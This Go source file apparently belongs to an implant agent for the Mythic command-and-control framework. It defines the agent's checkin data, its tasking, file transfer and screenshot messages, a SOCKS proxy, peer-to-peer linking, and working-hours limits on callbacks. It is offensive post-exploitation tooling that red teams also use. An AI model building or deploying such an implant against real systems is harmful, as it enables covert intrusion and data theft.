package structs

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Agent represents the agent instance
type Agent struct {
	PayloadUUID       string `json:"payload_uuid"`
	Architecture      string `json:"architecture"`
	Domain            string `json:"domain"`
	ExternalIP        string `json:"external_ip"`
	Host              string `json:"host"`
	Integrity         int    `json:"integrity_level"`
	InternalIP        string `json:"internal_ip"`
	OS                string `json:"os"`
	PID               int    `json:"pid"`
	ProcessName       string `json:"process_name"`
	SleepInterval     int    `json:"sleep_interval"`
	Jitter            int    `json:"jitter"`
	User              string `json:"user"`
	Description       string `json:"description"`
	WorkingHoursStart int    `json:"-"` // Minutes from midnight (e.g., 540 = 09:00). 0 with End=0 means disabled.
	WorkingHoursEnd   int    `json:"-"` // Minutes from midnight (e.g., 1020 = 17:00). 0 with Start=0 means disabled.
	WorkingDays       []int  `json:"-"` // ISO weekday numbers: Mon=1 .. Sun=7. Empty means all days.
}

// UpdateSleepParams updates the agent's sleep parameters
func (a *Agent) UpdateSleepParams(interval, jitter int) {
	a.SleepInterval = interval
	a.Jitter = jitter
}

// UpdateWorkingHours updates the agent's working hours configuration
func (a *Agent) UpdateWorkingHours(startMinutes, endMinutes int, days []int) {
	a.WorkingHoursStart = startMinutes
	a.WorkingHoursEnd = endMinutes
	a.WorkingDays = days
}

// WorkingHoursEnabled returns true if working hours restrictions are configured
func (a *Agent) WorkingHoursEnabled() bool {
	return a.WorkingHoursStart != 0 || a.WorkingHoursEnd != 0
}

// IsWithinWorkingHours checks if the current time falls within configured working hours.
// Returns true if working hours are disabled (always active) or if current time is within bounds.
func (a *Agent) IsWithinWorkingHours(now time.Time) bool {
	if !a.WorkingHoursEnabled() {
		return true
	}

	// Check day of week if working days are configured
	if len(a.WorkingDays) > 0 {
		isoDay := int(now.Weekday()) // Sunday=0 in Go
		if isoDay == 0 {
			isoDay = 7 // Convert to ISO: Sunday=7
		}
		dayAllowed := false
		for _, d := range a.WorkingDays {
			if d == isoDay {
				dayAllowed = true
				break
			}
		}
		if !dayAllowed {
			return false
		}
	}

	// Check time of day
	currentMinutes := now.Hour()*60 + now.Minute()
	if a.WorkingHoursStart <= a.WorkingHoursEnd {
		// Normal range: e.g., 09:00-17:00
		return currentMinutes >= a.WorkingHoursStart && currentMinutes < a.WorkingHoursEnd
	}
	// Overnight range: e.g., 22:00-06:00
	return currentMinutes >= a.WorkingHoursStart || currentMinutes < a.WorkingHoursEnd
}

// MinutesUntilWorkingHours calculates how many minutes until the next working period.
// Returns 0 if already within working hours. Uses local time.
func (a *Agent) MinutesUntilWorkingHours(now time.Time) int {
	if a.IsWithinWorkingHours(now) {
		return 0
	}

	currentMinutes := now.Hour()*60 + now.Minute()

	// If working days are set, check if today is a working day
	if len(a.WorkingDays) > 0 {
		isoDay := int(now.Weekday())
		if isoDay == 0 {
			isoDay = 7
		}

		// Check if today is a working day but we're outside hours
		todayIsWorkDay := false
		for _, d := range a.WorkingDays {
			if d == isoDay {
				todayIsWorkDay = true
				break
			}
		}

		if todayIsWorkDay && currentMinutes < a.WorkingHoursStart {
			// Today is a work day and start hasn't passed yet
			return a.WorkingHoursStart - currentMinutes
		}

		// Find the next working day
		for daysAhead := 1; daysAhead <= 7; daysAhead++ {
			nextDay := ((isoDay - 1 + daysAhead) % 7) + 1
			for _, d := range a.WorkingDays {
				if d == nextDay {
					// Calculate minutes until start of that day
					minutesToMidnight := 1440 - currentMinutes
					minutesAfterMidnight := (daysAhead-1)*1440 + a.WorkingHoursStart
					return minutesToMidnight + minutesAfterMidnight
				}
			}
		}
	}

	// No working days restriction, just time-of-day
	if currentMinutes >= a.WorkingHoursEnd && a.WorkingHoursStart <= a.WorkingHoursEnd {
		// Past end time, sleep until tomorrow's start
		return (1440 - currentMinutes) + a.WorkingHoursStart
	}
	if currentMinutes < a.WorkingHoursStart {
		return a.WorkingHoursStart - currentMinutes
	}

	// Fallback for overnight ranges
	return a.WorkingHoursStart - currentMinutes + 1440
}

// ParseWorkingHoursTime parses "HH:MM" format into minutes from midnight
func ParseWorkingHoursTime(s string) (int, error) {
	s = strings.TrimSpace(s)
	if s == "" {
		return 0, nil
	}
	parts := strings.Split(s, ":")
	if len(parts) != 2 {
		return 0, fmt.Errorf("invalid time format %q, expected HH:MM", s)
	}
	h, err := strconv.Atoi(parts[0])
	if err != nil || h < 0 || h > 23 {
		return 0, fmt.Errorf("invalid hour %q", parts[0])
	}
	m, err := strconv.Atoi(parts[1])
	if err != nil || m < 0 || m > 59 {
		return 0, fmt.Errorf("invalid minute %q", parts[1])
	}
	return h*60 + m, nil
}

// ParseWorkingDays parses "1,2,3,4,5" into a slice of ISO weekday numbers
func ParseWorkingDays(s string) ([]int, error) {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil, nil
	}
	parts := strings.Split(s, ",")
	days := make([]int, 0, len(parts))
	for _, p := range parts {
		d, err := strconv.Atoi(strings.TrimSpace(p))
		if err != nil || d < 1 || d > 7 {
			return nil, fmt.Errorf("invalid day %q, expected 1-7 (Mon=1, Sun=7)", p)
		}
		days = append(days, d)
	}
	return days, nil
}

// FormatWorkingHoursTime formats minutes from midnight as "HH:MM"
func FormatWorkingHoursTime(minutes int) string {
	return fmt.Sprintf("%02d:%02d", minutes/60, minutes%60)
}

// Task represents a task from Mythic
type Task struct {
	ID         string    `json:"id"`
	Command    string    `json:"command"`
	Params     string    `json:"parameters"`
	Timestamp  time.Time `json:"timestamp"`
	Job        *Job      `json:"-"` // Not marshalled to JSON
	stopped    *int32    // Atomic flag for task cancellation; pointer so copies share state
}

// NewTask creates a Task with the stopped flag properly initialized
func NewTask(id, command, params string) Task {
	stopped := new(int32)
	return Task{
		ID:      id,
		Command: command,
		Params:  params,
		stopped: stopped,
	}
}

// DidStop checks if the task should stop (goroutine-safe)
func (t *Task) DidStop() bool {
	if t.stopped == nil {
		return false
	}
	return atomic.LoadInt32(t.stopped) != 0
}

// ShouldStop checks if the task should stop (alias for DidStop, goroutine-safe)
func (t *Task) ShouldStop() bool {
	return t.DidStop()
}

// SetStop sets the stop flag for the task (goroutine-safe)
func (t *Task) SetStop() {
	if t.stopped == nil {
		v := int32(0)
		t.stopped = &v
	}
	atomic.StoreInt32(t.stopped, 1)
}

// NewResponse creates a new response for this task
func (t *Task) NewResponse() Response {
	return Response{
		TaskID: t.ID,
	}
}

// ProcessEntry represents a process for Mythic's process browser
type ProcessEntry struct {
	ProcessID       int    `json:"process_id"`
	ParentProcessID int    `json:"parent_process_id"`
	Architecture    string `json:"architecture"`
	Name            string `json:"name"`
	User            string `json:"user"`
	BinPath         string `json:"bin_path"`
	CommandLine     string `json:"command_line,omitempty"`
}

// Response represents a response to Mythic
type Response struct {
	TaskID          string               `json:"task_id"`
	UserOutput      string               `json:"user_output"`
	Status          string               `json:"status"`
	Completed       bool                 `json:"completed"`
	ProcessResponse interface{}          `json:"process_response,omitempty"`
	Processes       *[]ProcessEntry      `json:"processes,omitempty"`
	Upload          *FileUploadMessage   `json:"upload,omitempty"`
	Download        *FileDownloadMessage `json:"download,omitempty"`
}

// FileUploadMessage for requesting file from Mythic
type FileUploadMessage struct {
	ChunkSize int    `json:"chunk_size"`
	FileID    string `json:"file_id"`
	ChunkNum  int    `json:"chunk_num"`
	FullPath  string `json:"full_path"`
}

// FileDownloadMessage for sending file to Mythic
type FileDownloadMessage struct {
	TotalChunks  int    `json:"total_chunks,omitempty"`
	ChunkNum     int    `json:"chunk_num,omitempty"`
	ChunkData    string `json:"chunk_data,omitempty"`
	FullPath     string `json:"full_path,omitempty"`
	FileID       string `json:"file_id,omitempty"`
	IsScreenshot bool   `json:"is_screenshot,omitempty"`
}

// Job struct holds channels and state for task execution including file transfers
type Job struct {
	Stop                  *int
	SendResponses         chan Response
	SendFileToMythic      chan SendFileToMythicStruct
	GetFileFromMythic     chan GetFileFromMythicStruct
	FileTransfers         map[string]chan json.RawMessage
	FileTransfersMu       sync.RWMutex
}

// SetFileTransfer safely adds a file transfer channel to the map
func (j *Job) SetFileTransfer(key string, ch chan json.RawMessage) {
	j.FileTransfersMu.Lock()
	j.FileTransfers[key] = ch
	j.FileTransfersMu.Unlock()
}

// GetFileTransfer safely retrieves a file transfer channel from the map
func (j *Job) GetFileTransfer(key string) (chan json.RawMessage, bool) {
	j.FileTransfersMu.RLock()
	ch, ok := j.FileTransfers[key]
	j.FileTransfersMu.RUnlock()
	return ch, ok
}

// BroadcastFileTransfer safely sends data to all file transfer channels
func (j *Job) BroadcastFileTransfer(data json.RawMessage) {
	j.FileTransfersMu.RLock()
	defer j.FileTransfersMu.RUnlock()
	for _, ch := range j.FileTransfers {
		select {
		case ch <- data:
		case <-time.After(100 * time.Millisecond):
		}
	}
}

// SendFileToMythicStruct for downloading files from the agent to Mythic
type SendFileToMythicStruct struct {
	Task                  *Task
	IsScreenshot          bool
	FileName              string
	SendUserStatusUpdates bool
	FullPath              string
	Data                  *[]byte
	File                  *os.File
	FinishedTransfer      chan int
	TrackingUUID          string
	FileTransferResponse  chan json.RawMessage
}

// GetFileFromMythicStruct for uploading files from Mythic to the agent
type GetFileFromMythicStruct struct {
	Task                  *Task
	FullPath              string
	FileID                string
	SendUserStatusUpdates bool
	ReceivedChunkChannel  chan []byte
	TrackingUUID          string
	FileTransferResponse  chan json.RawMessage
}

// FileUploadMessageResponse is the response from Mythic when requesting file chunks
type FileUploadMessageResponse struct {
	ChunkNum    int    `json:"chunk_num"`
	ChunkData   string `json:"chunk_data"`
	TotalChunks int    `json:"total_chunks"`
}

// SocksMsg represents a single SOCKS proxy message exchanged with Mythic
type SocksMsg struct {
	ServerId uint32 `json:"server_id"`
	Data     string `json:"data"`
	Exit     bool   `json:"exit"`
}

// CommandResult represents the result of executing a command
type CommandResult struct {
	Output    string
	Status    string
	Completed bool
	Processes *[]ProcessEntry // Optional: populated by ps command for Mythic process browser
}

// DelegateMessage wraps a message to/from a linked P2P agent.
// When sending to Mythic: Message is the base64-encoded encrypted data from the child.
// When receiving from Mythic: Message is the base64-encoded encrypted data for the child.
type DelegateMessage struct {
	Message       string `json:"message"`        // Base64-encoded encrypted message
	UUID          string `json:"uuid"`            // Target agent UUID (or temp UUID during staging)
	C2ProfileName string `json:"c2_profile"`      // C2 profile name (e.g., "tcp")
	MythicUUID    string `json:"new_uuid,omitempty"` // Corrected UUID from Mythic after staging
}

// P2PConnectionMessage notifies Mythic about P2P link state changes (edges in the graph).
type P2PConnectionMessage struct {
	Source        string `json:"source"`         // Source callback UUID
	Destination   string `json:"destination"`    // Destination callback UUID
	Action        string `json:"action"`         // "add" or "remove"
	C2ProfileName string `json:"c2_profile"`     // "tcp"
}

// CheckinMessage represents the initial checkin message
type CheckinMessage struct {
	Action       string   `json:"action"`
	PayloadUUID  string   `json:"uuid"`
	User         string   `json:"user"`
	Host         string   `json:"host"`
	PID          int      `json:"pid"`
	OS           string   `json:"os"`
	Architecture string   `json:"architecture"`
	Domain       string   `json:"domain"`
	IPs          []string `json:"ips"`
	ExternalIP   string   `json:"external_ip"`
	ProcessName  string   `json:"process_name"`
	Integrity    int      `json:"integrity_level"`
}

// TaskingMessage represents the message to get tasking
type TaskingMessage struct {
	Action      string             `json:"action"`
	TaskingSize int                `json:"tasking_size"`
	Socks       []SocksMsg         `json:"socks,omitempty"`
	Delegates   []DelegateMessage  `json:"delegates,omitempty"`
	// Add agent identification for checkin updates
	PayloadUUID string `json:"uuid,omitempty"`
	PayloadType string `json:"payload_type,omitempty"`
	C2Profile   string `json:"c2_profile,omitempty"`
}

// PostResponseMessage represents posting a response back to Mythic
type PostResponseMessage struct {
	Action    string                 `json:"action"`
	Responses []Response             `json:"responses"`
	Socks     []SocksMsg             `json:"socks,omitempty"`
	Delegates []DelegateMessage      `json:"delegates,omitempty"`
	Edges     []P2PConnectionMessage `json:"edges,omitempty"`
}

// Command interface for all commands
type Command interface {
	Name() string
	Description() string
	Execute(task Task) CommandResult
}

// AgentCommand interface for commands that need agent access
type AgentCommand interface {
	Name() string
	Description() string
	Execute(task Task) CommandResult
	ExecuteWithAgent(task Task, agent *Agent) CommandResult
}

// FileListEntry for ls command
type FileListEntry struct {
	Name         string    `json:"name"`
	FullName     string    `json:"full_name"`
	IsFile       bool      `json:"is_file"`
	Permissions  string    `json:"permissions"`
	Size         int64     `json:"size"`
	Owner        string    `json:"owner"`
	Group        string    `json:"group"`
	CreationDate time.Time `json:"creation_date"`
	ModifyTime   time.Time `json:"modify_time"`
	AccessTime   time.Time `json:"access_time"`
}

// FileListing represents the ls command output
type FileListing struct {
	Host       string          `json:"host"`
	IsFile     bool            `json:"is_file"`
	Name       string          `json:"name"`
	ParentPath string          `json:"parent_path"`
	Success    bool            `json:"success"`
	Files      []FileListEntry `json:"files,omitempty"`
}
